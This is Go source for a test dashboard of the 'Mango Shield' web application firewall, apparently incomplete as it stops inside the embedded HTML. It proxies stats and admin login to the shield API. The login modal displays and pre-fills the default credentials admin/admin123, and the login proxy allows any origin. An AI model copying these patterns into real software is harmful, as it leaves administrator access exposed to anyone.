package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"sync/atomic"
	"time"
)

type StatsResponse struct {
	TotalRequests  int64         `json:"total_requests"`
	PassedReqs     int64         `json:"passed_requests"`
	BlockedReqs    int64         `json:"blocked_requests"`
	Challenged     int64         `json:"challenged_requests"`
	CurrentRPS     int64         `json:"current_rps"`
	PeakRPS        int64         `json:"peak_rps"`
	ActiveConns    int64         `json:"active_conns"`
	ActiveBans     int64         `json:"active_bans"`
	IsUnderAttack  bool          `json:"is_under_attack"`
	UptimeSeconds  float64       `json:"uptime_seconds"`
	XDPEnabled     bool          `json:"xdp_enabled"`
	XDPBannedIPs   int64         `json:"xdp_banned_ips"`
	XDPDroppedPkts int64         `json:"xdp_dropped_pkts"`
	CacheHits      int64         `json:"cache_hits"`
	CacheMisses    int64         `json:"cache_misses"`
	CacheBypasses  int64         `json:"cache_bypasses"`
	MeshEnabled    bool          `json:"mesh_enabled"`
	MeshNodes      int           `json:"mesh_nodes"`
	MeshMembers    []interface{} `json:"mesh_members"`
	HistPassed     []uint64      `json:"hist_passed"`
	HistBlocked    []uint64      `json:"hist_blocked"`
	CurrPassed     uint64        `json:"curr_passed"`
	CurrBlocked    uint64        `json:"curr_blocked"`
	Bps            uint64        `json:"bps"`
	Pps            uint64        `json:"pps"`
	Status         string        `json:"status"`
	Uptime         string        `json:"uptime"`
}

var (
	histPassed  = make([]uint64, 60)
	histBlocked = make([]uint64, 60)
	lastJSON    atomic.Value

	apiBaseURL string
)

func getEnv(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func init() {
	initialStats := map[string]interface{}{
		"status":           "healthy",
		"uptime":           "Active",
		"hist_passed":      make([]uint64, 60),
		"hist_blocked":     make([]uint64, 60),
		"total_requests":   0,
		"passed_requests":  0,
		"blocked_requests": 0,
		"current_rps":      0,
		"peak_rps":         0,
		"active_conns":     0,
		"active_bans":      0,
		"uptime_seconds":   1,
		"is_under_attack":  false,
		"cache_hits":       0,
		"cache_misses":     0,
		"cache_bypasses":   0,
		"xdp_dropped_pkts": 0,
		"xdp_enabled":      true,
		"mesh_nodes":       2,
		"mesh_members":     []interface{}{},
	}
	initialData, _ := json.Marshal(initialStats)
	lastJSON.Store(initialData)
	apiBaseURL = getEnv("MANGO_API_URL", "http://mango-shield:9090")
}

func fetchAPI(path string) ([]byte, error) {
	client := &http.Client{Timeout: 2 * time.Second}
	candidates := []string{
		apiBaseURL + path,
		"http://127.0.0.1:1234" + path,
		"http://127.0.0.1:9090" + path,
		"http://mango-shield:9090" + path,
		"http://localhost:9090" + path,
	}

	for _, urlStr := range candidates {
		req, errReq := http.NewRequest("GET", urlStr, nil)
		if errReq != nil {
			continue
		}
		req.Header.Set("X-Sync-Internal", "true")
		resp, err := client.Do(req)
		if err == nil && resp.StatusCode == 200 {
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err == nil && len(body) > 0 {
				return body, nil
			}
		}
		if resp != nil {
			resp.Body.Close()
		}
	}
	return nil, fmt.Errorf("api endpoint unavailable")
}

func fetchMetrics() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	apiHost := getEnv("MANGO_SHIELD_HOST", "mango-shield")
	nodes := []string{
		"http://" + apiHost + ":9090",
		"http://127.0.0.1:9090",
		"http://localhost:9090",
	}

	client := &http.Client{Timeout: 1 * time.Second}

	for range ticker.C {
		var aggTotal, aggBlocked, aggPassed, aggRPS, aggPeak, aggConns, aggBans, aggXDPDrops, aggXDPBanned int64
		var isUnderAttack bool
		var meshMembers []interface{}
		var nodeCount int
		var firstRaw map[string]interface{}

		for _, node := range nodes {
			req, errReq := http.NewRequest("GET", node+"/api/stats", nil)
			if errReq != nil {
				continue
			}
			req.Header.Set("X-Sync-Internal", "true")
			resp, err := client.Do(req)
			if err == nil && resp.StatusCode == 200 {
				body, err := io.ReadAll(resp.Body)
				resp.Body.Close()
				if err == nil && len(body) > 0 {
					var raw map[string]interface{}
					if err := json.Unmarshal(body, &raw); err == nil {
						firstRaw = raw
						if t, ok := raw["total_requests"].(float64); ok {
							aggTotal = int64(t)
						}
						if b, ok := raw["blocked_requests"].(float64); ok {
							aggBlocked = int64(b)
						}
						if p, ok := raw["passed_requests"].(float64); ok {
							aggPassed = int64(p)
						}
						if r, ok := raw["current_rps"].(float64); ok {
							aggRPS = int64(r)
						}
						if pk, ok := raw["peak_rps"].(float64); ok {
							aggPeak = int64(pk)
						}
						if c, ok := raw["active_conns"].(float64); ok {
							aggConns = int64(c)
						}
						if bn, ok := raw["active_bans"].(float64); ok {
							aggBans = int64(bn)
						}
						if xdpDr, ok := raw["xdp_dropped_pkts"].(float64); ok {
							aggXDPDrops = int64(xdpDr)
						}
						if xdpBn, ok := raw["xdp_banned_ips"].(float64); ok {
							aggXDPBanned = int64(xdpBn)
						}
						if atk, ok := raw["is_under_attack"].(bool); ok {
							isUnderAttack = atk
						}
						if m, ok := raw["mesh_members"].([]interface{}); ok {
							meshMembers = m
						}
						if mn, ok := raw["mesh_nodes"].(float64); ok && int(mn) > 0 {
							nodeCount = int(mn)
						} else if len(meshMembers) > 0 {
							nodeCount = len(meshMembers)
						} else {
							nodeCount = 0
						}
						break // Got valid stats from local shield instance!
					}
				}
			} else if resp != nil {
				resp.Body.Close()
			}
		}

		if firstRaw != nil {
			copy(histPassed[0:59], histPassed[1:60])
			copy(histBlocked[0:59], histBlocked[1:60])
			histPassed[59] = uint64(aggPassed)
			histBlocked[59] = uint64(aggBlocked)

			firstRaw["total_requests"] = aggTotal
			firstRaw["blocked_requests"] = aggBlocked
			firstRaw["passed_requests"] = aggPassed
			firstRaw["current_rps"] = aggRPS
			firstRaw["peak_rps"] = aggPeak
			firstRaw["active_conns"] = aggConns
			firstRaw["active_bans"] = aggBans
			firstRaw["xdp_dropped_pkts"] = aggXDPDrops
			firstRaw["xdp_banned_ips"] = aggXDPBanned
			firstRaw["is_under_attack"] = isUnderAttack
			firstRaw["mesh_nodes"] = nodeCount
			if len(meshMembers) > 0 {
				firstRaw["mesh_members"] = meshMembers
			}
			firstRaw["hist_passed"] = histPassed
			firstRaw["hist_blocked"] = histBlocked
			firstRaw["status"] = "healthy"

			data, _ := json.Marshal(firstRaw)
			lastJSON.Store(data)
		}
	}
}

func main() {
	go fetchMetrics()

	mux := http.NewServeMux()
	handleLogo := func(w http.ResponseWriter, r *http.Request) {
		if _, err := os.Stat("logo-mango.png"); err == nil {
			w.Header().Set("Content-Type", "image/png")
			http.ServeFile(w, r, "logo-mango.png")
			return
		}
		if _, err := os.Stat("../logo-mango.png"); err == nil {
			w.Header().Set("Content-Type", "image/png")
			http.ServeFile(w, r, "../logo-mango.png")
			return
		}
		w.Header().Set("Content-Type", "image/svg+xml")
		w.Header().Set("Cache-Control", "public, max-age=31536000, immutable")
		w.Write([]byte(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="32" height="32"><defs><linearGradient id="mGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#FF5722"/><stop offset="50%" stop-color="#FF9800"/><stop offset="100%" stop-color="#FFC107"/></linearGradient><linearGradient id="lGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#4CAF50"/><stop offset="100%" stop-color="#2E7D32"/></linearGradient></defs><path d="M50 15 C25 15 15 35 15 60 C15 80 32 90 50 90 C72 90 85 75 85 55 C85 30 70 15 50 15 Z" fill="url(#mGrad)"/><path d="M50 15 C55 5 65 2 75 5 C70 15 60 18 50 15 Z" fill="url(#lGrad)"/></svg>`))
	}

	mux.HandleFunc("/logo-mango.png", handleLogo)
	mux.HandleFunc("/favicon.ico", handleLogo)
	mux.HandleFunc("/apple-touch-icon.png", handleLogo)
	mux.HandleFunc("/logo-mango-small.png", func(w http.ResponseWriter, r *http.Request) {
		if _, err := os.Stat("logo-mango-small.png"); err == nil {
			w.Header().Set("Content-Type", "image/png")
			http.ServeFile(w, r, "logo-mango-small.png")
			return
		}
		if _, err := os.Stat("../logo-mango-small.png"); err == nil {
			w.Header().Set("Content-Type", "image/png")
			http.ServeFile(w, r, "../logo-mango-small.png")
			return
		}
		w.Header().Set("Content-Type", "image/svg+xml")
		w.Header().Set("Cache-Control", "public, max-age=31536000, immutable")
		w.Write([]byte(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="24" height="24"><defs><linearGradient id="mGrad2" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#FF5722"/><stop offset="100%" stop-color="#FFC107"/></linearGradient></defs><path d="M50 15 C25 15 15 35 15 60 C15 80 32 90 50 90 C72 90 85 75 85 55 C85 30 70 15 50 15 Z" fill="url(#mGrad2)"/><path d="M50 15 C55 5 65 2 75 5 C70 15 60 18 50 15 Z" fill="#4CAF50"/></svg>`))
	})

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
		w.Header().Set("Pragma", "no-cache")
		w.Header().Set("Expires", "0")
		fmt.Fprint(w, htmlPage)
	})
	mux.HandleFunc("/api/stats", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
		if data := lastJSON.Load(); data != nil {
			w.Write(data.([]byte))
			return
		}
		body, err := fetchAPI("/api/stats")
		if err != nil {
			w.Write([]byte(`{"status":"waiting"}`))
			return
		}
		w.Write(body)
	})
	mux.HandleFunc("/api/system-stats", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
		body, err := fetchAPI("/api/system-stats")
		if err != nil {
			w.Write([]byte(`{"error":"unavailable"}`))
			return
		}
		w.Write(body)
	})
	mux.HandleFunc("/api/rps-history", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
		body, err := fetchAPI("/api/rps-history")
		if err != nil {
			w.Write([]byte(`{"rps":[]}`))
			return
		}
		w.Write(body)
	})
	mux.HandleFunc("/api/login", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Access-Control-Allow-Origin", "*")
		if r.Method != http.MethodPost {
			http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
			return
		}
		body, err := io.ReadAll(r.Body)
		if err != nil {
			w.Write([]byte(`{"status":"error","message":"invalid request"}`))
			return
		}
		client := &http.Client{Timeout: 3 * time.Second}
		resp, err := client.Post("http://127.0.0.1:9090/api/login", "application/json", bytes.NewReader(body))
		if err != nil {
			resp, err = client.Post("http://mango-shield:9090/api/login", "application/json", bytes.NewReader(body))
		}
		if err != nil {
			resp, err = client.Post("http://"+getEnv("MANGO_SHIELD_HOST", "mango-shield")+":9090/api/login", "application/json", bytes.NewReader(body))
		}
		if err != nil || resp == nil {
			w.Write([]byte(`{"status":"error","message":"Admin authentication API unreachable"}`))
			return
		}
		defer resp.Body.Close()
		respBody, _ := io.ReadAll(resp.Body)
		for k, v := range resp.Header {
			if k == "Set-Cookie" {
				for _, val := range v {
					w.Header().Add(k, val)
				}
			}
		}
		w.WriteHeader(resp.StatusCode)
		w.Write(respBody)
	})

	fmt.Println("Mango Test Site listening on :8080")
	http.ListenAndServe(":8080", mux)
}

var htmlPage = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mango Shield WAF — Enterprise Security Platform</title>
    <meta name="description" content="Mango Shield WAF - Enterprise L7 DDoS Protection and Web Application Firewall">
    <link rel="icon" type="image/svg+xml" href="/logo-mango.png">
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="apple-touch-icon" href="/logo-mango.png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<style>
:root {
  --bg: #020617;
  --bg-card: rgba(15, 23, 42, 0.75);
  --bg-card-solid: #0f172a;
  --border: rgba(51, 65, 85, 0.5);
  --border-hover: rgba(6, 182, 212, 0.4);
  --primary: #10b981;
  --cyan: #06b6d4;
  --amber: #f59e0b;
  --red: #ef4444;
  --purple: #8b5cf6;
  --text: #f8fafc;
  --text-muted: #94a3b8;
  --text-dim: #64748b;
  --sans: 'Inter', system-ui, -apple-system, sans-serif;
  --mono: 'Fira Code', 'Consolas', monospace;
  --radius: 12px;
  --radius-sm: 8px;
}
*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
html { scroll-behavior: smooth; }
body {
  background: var(--bg);
  color: var(--text);
  font-family: var(--sans);
  min-height: 100vh;
  line-height: 1.5;
  -webkit-font-smoothing: antialiased;
}

/* ======================== NAVBAR ======================== */
.navbar {
  background: rgba(2, 6, 23, 0.92);
  backdrop-filter: blur(20px);
  -webkit-backdrop-filter: blur(20px);
  border-bottom: 1px solid var(--border);
  position: sticky;
  top: 0;
  z-index: 100;
  padding: 0 24px;
}
.nav-inner {
  max-width: 1440px;
  margin: 0 auto;
  display: flex;
  align-items: center;
  justify-content: space-between;
  height: 56px;
}
.nav-brand {
  display: flex;
  align-items: center;
  gap: 10px;
  font-weight: 700;
  font-size: 16px;
  color: var(--text);
  text-decoration: none;
  white-space: nowrap;
}
.nav-brand svg { flex-shrink: 0; }
.nav-ver {
  font-size: 10px;
  font-family: var(--mono);
  background: rgba(6, 182, 212, 0.12);
  color: var(--cyan);
  border: 1px solid rgba(6, 182, 212, 0.25);
  padding: 2px 8px;
  border-radius: 10px;
  letter-spacing: 0.5px;
}
.nav-tabs {
  display: flex;
  gap: 2px;
  overflow-x: auto;
  -webkit-overflow-scrolling: touch;
  scrollbar-width: none;
}
.nav-tabs::-webkit-scrollbar { display: none; }
.nav-tab {
  background: none;
  border: none;
  color: var(--text-muted);
  font-family: var(--sans);
  font-size: 13px;
  font-weight: 500;
  padding: 8px 14px;
  border-radius: 8px;
  cursor: pointer;
  transition: all 0.2s;
  white-space: nowrap;
}
.nav-tab:hover { color: var(--text); background: rgba(51, 65, 85, 0.4); }
.nav-tab.active { color: var(--cyan); background: rgba(6, 182, 212, 0.1); }
.nav-status {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 5px 14px;
  border-radius: 20px;
  font-size: 11px;
  font-weight: 600;
  letter-spacing: 0.4px;
  flex-shrink: 0;
}
.nav-status.ok {
  background: rgba(16, 185, 129, 0.1);
  color: var(--primary);
  border: 1px solid rgba(16, 185, 129, 0.25);
}
.nav-status.atk {
  background: rgba(239, 68, 68, 0.12);
  color: var(--red);
  border: 1px solid rgba(239, 68, 68, 0.3);
  animation: pulseAtk 1.5s infinite;
}
@keyframes pulseAtk { 50% { opacity: 0.65; } }
.status-dot { width: 7px; height: 7px; border-radius: 50%; background: currentColor; }

/* ======================== LAYOUT ======================== */
.main-content {
  max-width: 1440px;
  margin: 0 auto;
  padding: 24px;
  min-height: calc(100vh - 56px - 48px);
}
.page { display: none; }
.page.active { display: block; animation: fadeIn 0.25s ease-out; }
@keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }

/* ======================== CARDS ======================== */
.card {
  background: var(--bg-card);
  backdrop-filter: blur(12px);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 20px;
  transition: border-color 0.3s, box-shadow 0.3s, transform 0.2s;
}
.card:hover {
  border-color: var(--border-hover);
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}
.card-title {
  font-size: 13px;
  font-weight: 600;
  color: var(--text);
  margin-bottom: 16px;
  display: flex;
  align-items: center;
  gap: 8px;
}

/* ======================== STAT GRID ======================== */
.stat-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
  gap: 14px;
  margin-bottom: 24px;
}
.stat-card {
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 16px 18px;
  transition: border-color 0.3s, transform 0.2s;
}
.stat-card:hover { border-color: var(--border-hover); transform: translateY(-2px); }
.stat-label {
  font-size: 11px;
  font-weight: 600;
  color: var(--text-muted);
  text-transform: uppercase;
  letter-spacing: 0.7px;
  margin-bottom: 6px;
}
.stat-val {
  font-size: 26px;
  font-weight: 800;
  font-family: var(--mono);
  line-height: 1.1;
}
.stat-sub {
  font-size: 11px;
  color: var(--text-dim);
  margin-top: 4px;
}
.c-cyan .stat-val { color: var(--cyan); }
.c-green .stat-val { color: var(--primary); }
.c-red .stat-val { color: var(--red); }
.c-amber .stat-val { color: var(--amber); }
.c-purple .stat-val { color: var(--purple); }

/* ======================== GRID LAYOUTS ======================== */
.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 24px; }
.grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; margin-bottom: 24px; }
.grid-4 { display: grid; grid-template-columns: repeat(4, 1fr); gap: 14px; margin-bottom: 24px; }
.mb-24 { margin-bottom: 24px; }

/* ======================== PROGRESS BARS ======================== */
.prog-row { margin-bottom: 14px; }
.prog-header {
  display: flex;
  justify-content: space-between;
  font-size: 12px;
  font-weight: 500;
  margin-bottom: 5px;
}
.prog-track {
  height: 6px;
  background: rgba(30, 41, 59, 0.8);
  border-radius: 4px;
  overflow: hidden;
}
.prog-bar {
  height: 100%;
  border-radius: 4px;
  transition: width 0.5s ease-out;
}
.prog-bar.green { background: linear-gradient(90deg, #059669, #10b981); }
.prog-bar.amber { background: linear-gradient(90deg, #d97706, #f59e0b); }
.prog-bar.red { background: linear-gradient(90deg, #dc2626, #ef4444); }
.prog-bar.cyan { background: linear-gradient(90deg, #0891b2, #06b6d4); }
.prog-bar.purple { background: linear-gradient(90deg, #7c3aed, #8b5cf6); }

/* ======================== CHART CANVAS ======================== */
.chart-wrap { position: relative; width: 100%; height: 200px; }
.chart-wrap canvas { width: 100% !important; height: 200px !important; }

/* ======================== TERMINAL ======================== */
.terminal {
  background: #010409;
  border: 1px solid var(--border);
  border-radius: var(--radius-sm);
  padding: 12px 16px;
  font-family: var(--mono);
  font-size: 12px;
  max-height: 280px;
  overflow-y: auto;
  line-height: 1.7;
}
.term-line {
  padding: 2px 0;
  border-bottom: 1px solid rgba(255, 255, 255, 0.02);
  display: flex;
  gap: 10px;
}
.term-ts { color: var(--cyan); opacity: 0.7; white-space: nowrap; }
.term-line.warn .term-msg { color: var(--amber); }
.term-line.err .term-msg { color: var(--red); }
.term-msg { color: var(--text-muted); }

/* ======================== ATTACK SIM ======================== */
.attack-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
  gap: 12px;
}
.atk-item {
  background: rgba(30, 41, 59, 0.5);
  border: 1px solid var(--border);
  border-radius: var(--radius-sm);
  padding: 14px 16px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 12px;
  transition: border-color 0.3s;
}
.atk-item:hover { border-color: var(--border-hover); }
.atk-info { flex: 1; min-width: 0; }
.atk-name { font-weight: 600; font-size: 13px; margin-bottom: 2px; }
.atk-desc { font-size: 11px; color: var(--text-muted); }
.atk-btn {
  background: rgba(239, 68, 68, 0.12);
  border: 1px solid rgba(239, 68, 68, 0.3);
  color: var(--red);
  font-family: var(--sans);
  font-size: 12px;
  font-weight: 600;
  padding: 6px 14px;
  border-radius: 6px;
  cursor: pointer;
  transition: all 0.2s;
  white-space: nowrap;
  flex-shrink: 0;
}
.atk-btn:hover { background: rgba(239, 68, 68, 0.2); }
.atk-btn.safe {
  background: rgba(16, 185, 129, 0.12);
  border-color: rgba(16, 185, 129, 0.3);
  color: var(--primary);
}

/* ======================== KV TABLE ======================== */
.kv-table { width: 100%; border-collapse: collapse; }
.kv-table td {
  padding: 8px 0;
  border-bottom: 1px solid rgba(51, 65, 85, 0.3);
  font-size: 13px;
}
.kv-table td:first-child { color: var(--text-muted); padding-right: 16px; white-space: nowrap; }
.kv-table td:last-child { font-family: var(--mono); font-size: 12px; color: var(--cyan); word-break: break-all; }

/* ======================== FOOTER ======================== */
.footer {
  text-align: center;
  padding: 16px 24px;
  color: var(--text-dim);
  font-size: 12px;
  border-top: 1px solid rgba(51, 65, 85, 0.2);
}

/* ======================== TOASTS ======================== */
.toast-container {
  position: fixed;
  top: 64px;
  right: 16px;
  z-index: 300;
  display: flex;
  flex-direction: column;
  gap: 8px;
}
.toast {
  background: var(--bg-card-solid);
  border: 1px solid var(--border);
  border-radius: var(--radius-sm);
  padding: 10px 16px;
  font-size: 13px;
  color: var(--text);
  box-shadow: 0 8px 24px rgba(0,0,0,0.5);
  animation: slideIn 0.3s ease-out, fadeOut 0.3s 3.7s ease-in forwards;
  max-width: 340px;
}
.toast.t-warn { border-left: 3px solid var(--amber); }
.toast.t-err { border-left: 3px solid var(--red); }
.toast.t-ok { border-left: 3px solid var(--primary); }
@keyframes slideIn { from { transform: translateX(100%); opacity: 0; } }
@keyframes fadeOut { to { opacity: 0; transform: translateX(30px); } }

/* ======================== CONN STATUS ======================== */
.conn-indicator {
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 11px;
  font-weight: 500;
}
.conn-dot {
  width: 6px;
  height: 6px;
  border-radius: 50%;
  transition: background 0.3s;
}
.conn-dot.on { background: var(--primary); box-shadow: 0 0 6px var(--primary); }
.conn-dot.off { background: var(--red); box-shadow: 0 0 6px var(--red); }

/* ======================== SKELETON ======================== */
.skel {
  background: linear-gradient(90deg, rgba(51,65,85,0.2) 25%, rgba(51,65,85,0.4) 50%, rgba(51,65,85,0.2) 75%);
  background-size: 200% 100%;
  animation: shimmer 1.5s infinite;
  border-radius: 4px;
}
.skel-text { height: 14px; width: 60%; margin-bottom: 4px; }
.skel-val { height: 28px; width: 80px; }
@keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }

/* ======================== RESPONSIVE ======================== */
@media (max-width: 1024px) {
  .grid-3 { grid-template-columns: 1fr 1fr; }
  .grid-4 { grid-template-columns: repeat(2, 1fr); }
}
@media (max-width: 960px) {
  .grid-2 { grid-template-columns: 1fr; }
}
@media (max-width: 768px) {
  .navbar { padding: 0 12px; }
  .nav-inner { flex-wrap: wrap; height: auto; padding: 10px 0; gap: 8px; }
  .nav-brand .nav-ver { display: none; }
  .nav-tabs { width: 100%; order: 3; padding-bottom: 4px; }
  .nav-status { order: 2; }
  .main-content { padding: 16px 12px; }
  .stat-grid { grid-template-columns: repeat(2, 1fr); gap: 10px; }
  .stat-val { font-size: 22px; }
  .grid-3 { grid-template-columns: 1fr; }
  .grid-4 { grid-template-columns: 1fr 1fr; }
  .chart-wrap { height: 160px; }
  .chart-wrap canvas { height: 160px !important; }
  .attack-grid { grid-template-columns: 1fr; }
}
.admin-btn {
  background: rgba(6, 182, 212, 0.12);
  border: 1px solid rgba(6, 182, 212, 0.3);
  color: var(--cyan);
  font-family: var(--sans);
  font-size: 12px;
  font-weight: 600;
  padding: 6px 12px;
  border-radius: 8px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 6px;
  transition: all 0.2s;
  flex-shrink: 0;
}
.admin-btn:hover { background: rgba(6, 182, 212, 0.25); color: #fff; }
.admin-btn.logged-in { background: rgba(16, 185, 129, 0.15); border-color: rgba(16, 185, 129, 0.4); color: var(--primary); }

.modal-overlay {
  position: fixed;
  top: 0; left: 0; right: 0; bottom: 0;
  background: rgba(2, 6, 23, 0.85);
  backdrop-filter: blur(8px);
  -webkit-backdrop-filter: blur(8px);
  z-index: 1000;
  display: none;
  align-items: center;
  justify-content: center;
  padding: 20px;
}
.modal-overlay.active { display: flex; animation: fadeIn 0.2s ease-out; }
.modal-card {
  background: var(--bg-card-solid);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  max-width: 440px;
  width: 100%;
  padding: 24px;
  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
}
.modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
.modal-title { font-size: 16px; font-weight: 700; color: var(--text); }
.modal-close { background: none; border: none; color: var(--text-muted); font-size: 24px; cursor: pointer; line-height: 1; }
.form-group { margin-bottom: 14px; }
.form-group label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 6px; font-weight: 500; }
.form-group input { width: 100%; background: #020617; border: 1px solid var(--border); border-radius: 6px; padding: 10px 12px; color: var(--text); font-family: var(--sans); font-size: 13px; outline: none; }
.form-group input:focus { border-color: var(--cyan); }
</style>
</head>
<body>

<div class="toast-container" id="toasts"></div>

<nav class="navbar">
  <div class="nav-inner">
    <a class="nav-brand" href="javascript:void(0)">
      <svg width="28" height="28" viewBox="0 0 100 100" style="flex-shrink:0"><defs><linearGradient id="tsMGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#FF5722"/><stop offset="50%" stop-color="#FF9800"/><stop offset="100%" stop-color="#FFC107"/></linearGradient><linearGradient id="tsLGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#4CAF50"/><stop offset="100%" stop-color="#2E7D32"/></linearGradient></defs><path d="M50 15 C25 15 15 35 15 60 C15 80 32 90 50 90 C72 90 85 75 85 55 C85 30 70 15 50 15 Z" fill="url(#tsMGrad)"/><path d="M50 15 C55 5 65 2 75 5 C70 15 60 18 50 15 Z" fill="url(#tsLGrad)"/></svg>
      <span>MANGO SHIELD</span>
      <span class="nav-ver">v3.0</span>
    </a>
    <div class="nav-tabs" id="navTabs">
      <button class="nav-tab active" data-tab="home" onclick="switchTab('home')">Home</button>
      <button class="nav-tab" data-tab="tests" onclick="switchTab('tests')">Test Suite</button>
    </div>
    <div style="display:flex;align-items:center;gap:12px">
      <button class="admin-btn" id="adminBtn" onclick="toggleAdminModal()">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7a5 5 0 0 0-5-5zm-3 5a3 3 0 0 1 6 0v3H9V7z"/></svg>
        <span id="adminBtnText">Admin Login</span>
      </button>
      <div class="nav-status ok" id="navStatus">
        <div class="status-dot"></div>
        <span id="navStatusText">OPERATIONAL</span>
      </div>
    </div>
  </div>
</nav>

<div class="modal-overlay" id="adminModal">
  <div class="modal-card">
    <div class="modal-header">
      <div class="modal-title">Mango Shield Admin Authentication</div>
      <button class="modal-close" onclick="toggleAdminModal()">&times;</button>
    </div>
    <div class="modal-body">
      <p style="font-size:13px;color:var(--text-muted);margin-bottom:16px">
        Authenticate with administrator credentials (Default: <code style="color:var(--cyan)">admin</code> / <code style="color:var(--cyan)">admin123</code>) to unlock Management APIs, Cache Purging, WAF Rules, and Security Telemetry.
      </p>
      <form id="adminLoginForm" onsubmit="submitAdminLogin(event)">
        <div class="form-group">
          <label>Username</label>
          <input type="text" id="adminUser" value="admin" required placeholder="admin">
        </div>
        <div class="form-group">
          <label>Password</label>
          <input type="password" id="adminPass" value="admin123" required placeholder="Password">
        </div>
        <div id="loginMsg" style="font-size:12px;display:none;margin-bottom:10px"></div>
        <button type="submit" class="atk-btn safe" style="width:100%;padding:10px">Authenticate Admin</button>
      </form>
    </div>
  </div>
</div>

<main class="main-content">

<!-- ============== HOME ============== -->
<section class="page active" id="page-home">
  <div class="stat-grid">
    <div class="stat-card c-cyan"><div class="stat-label">Current RPS</div><div class="stat-val" id="h_rps">0</div><div class="stat-sub">requests / second</div></div>
    <div class="stat-card"><div class="stat-label">Total Requests</div><div class="stat-val" id="h_total">0</div><div class="stat-sub">inspected traffic</div></div>
    <div class="stat-card c-red"><div class="stat-label">Blocked</div><div class="stat-val" id="h_blocked">0</div><div class="stat-sub">threats mitigated</div></div>
    <div class="stat-card c-green"><div class="stat-label">Passed</div><div class="stat-val" id="h_passed">0</div><div class="stat-sub">clean traffic</div></div>
    <div class="stat-card c-amber"><div class="stat-label">Peak RPS</div><div class="stat-val" id="h_peak">0</div><div class="stat-sub">highest throughput</div></div>
    <div class="stat-card c-purple"><div class="stat-label">Active Bans</div><div class="stat-val" id="h_bans">0</div><div class="stat-sub">IP blacklists</div></div>
  </div>

  <div class="card mb-24">
    <div class="card-title">Real-Time Traffic Telemetry (60s window)</div>
    <div class="chart-wrap"><canvas id="homeChart" width="800" height="200"></canvas></div>
  </div>

  <div class="grid-2">
    <div class="card">
      <div class="card-title">System Health</div>
      <div class="prog-row"><div class="prog-header"><span>WAF Block Rate</span><span id="h_brate">0%</span></div><div class="prog-track"><div class="prog-bar green" id="h_bbar" style="width:0%"></div></div></div>
      <div class="prog-row"><div class="prog-header"><span>Connection Load</span><span id="h_cload">0%</span></div><div class="prog-track"><div class="prog-bar cyan" id="h_cbar" style="width:0%"></div></div></div>
      <div class="prog-row"><div class="prog-header"><span>Uptime</span><span id="h_uptime" style="font-family:var(--mono);color:var(--cyan)">Active</span></div></div>
      <div class="prog-row"><div class="prog-header"><span>Connection</span><span><span class="conn-indicator"><span class="conn-dot on" id="connDot"></span><span id="connText">Connected</span></span></span></div></div>
    </div>
    <div class="card">
      <div class="card-title">Event Feed</div>
